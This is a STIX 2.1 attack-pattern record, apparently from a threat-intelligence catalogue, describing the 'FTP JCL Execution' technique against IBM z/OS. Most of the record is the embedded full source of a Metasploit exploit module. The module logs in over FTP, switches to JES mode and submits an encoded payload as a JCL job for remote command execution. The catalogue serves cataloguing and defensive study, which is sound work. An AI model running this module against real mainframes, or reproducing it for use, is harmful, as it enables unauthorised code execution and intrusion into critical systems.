{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--61ff71f8-904d-454b-9fb2-c82c0d3cd231",
    "created": "2024-08-14T16:35:13.033167Z",
    "modified": "2024-08-14T16:35:13.033172Z",
    "name": "FTP JCL Execution",
    "description": "(Submit JCL to z/OS via FTP and SITE FILE=JES. This exploit requires valid credentials on the target system)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/mainframe/ftp/ftp_jcl_creds.rb",
            "external_id": "ftp_jcl_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'FTP JCL Execution',\n      'Description'    => %q{(Submit JCL to z/OS via FTP and SITE FILE=JES.\n        This exploit requires valid credentials on the target system)},\n      'Author'         =>\n         [\n           'Bigendian Smalls',\n           'mainframed a.k.a. soldier of fortran',\n           'S&Oxballs a.k.a. chiefascot'\n         ],\n      'Arch'           => ARCH_CMD,\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['mainframe'],\n      'Privileged'     => false,\n      'Targets'        => [['Automatic', {}]],\n      'DisclosureDate' => '2013-05-12',\n      'DisableNops'    => 'true',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(21),\n        OptInt.new('SLEEP', [ false, \"Time to wait before checking if job has completed.\", 5 ])\n      ], self.class\n    )\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    ##\n    # Connect to get the FTP banner and check target OS\n    ##\n    if !connect_login\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failed to connect to FTP server\")\n    else\n      print_good(\"Successfully connected to FTP server.\")\n    end\n    test_jes = send_cmd(['site', 'file=jes'])\n\n    # Disconnect and check cached self.banner\n    disconnect\n\n    ##\n    # Check if the target system has an FTP server running on z/OS\"\n    ##\n    case banner\n    when /IBM FTP CS V.R./\n      case test_jes\n      when /200 SITE/\n        print_status(\"Found IBM z/OS Banner and JES commands accepted\")\n        return Exploit::CheckCode::Vulnerable\n      else\n        print_error(\"Found IBM z/OS Banner but SITE FILE=JES failed. Try anyway!\")\n        return Exploit::CheckCode::Detected\n      end\n\n    ##\n    # Return the Safe flag if system is not exploitable\n    ##\n    else\n      print_status(\"We could not recognize the server banner: #{banner.strip}\")\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  ##\n  # Exploit the target system by submitting a JCL job via FTP\n  ##\n  def exploit\n    if !connect_login\n      fail_with(Failure::UnexpectedReply, \"#{rhost}:#{rport} - Failed to connect to FTP server\")\n    else\n      print_good(\"Successfully connected to FTP server.\")\n    end\n\n    send_cmd(['site', 'file=jes'])\n    print_good(\"Successfully switched to JES mode\")\n\n    jcl_file_name = \"#{Rex::Text.rand_text_alpha(8).upcase}\"\n    print_status(\"Uploading JCL file: #{jcl_file_name}\")\n\n    res = send_cmd_data(['put', jcl_file_name], payload.encoded)\n    if res.nil?\n      fail_with(Failure::UnexpectedReply, \"#{rhost}:#{rport} - Failed to upload JCL to FTP server\")\n    end\n\n    job_num = res.lines.first.split.last\n    print_good(\"Job Submitted. Job number is #{job_num}\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-12",
    "x_mitre_platforms": [
        "['mainframe']"
    ]
}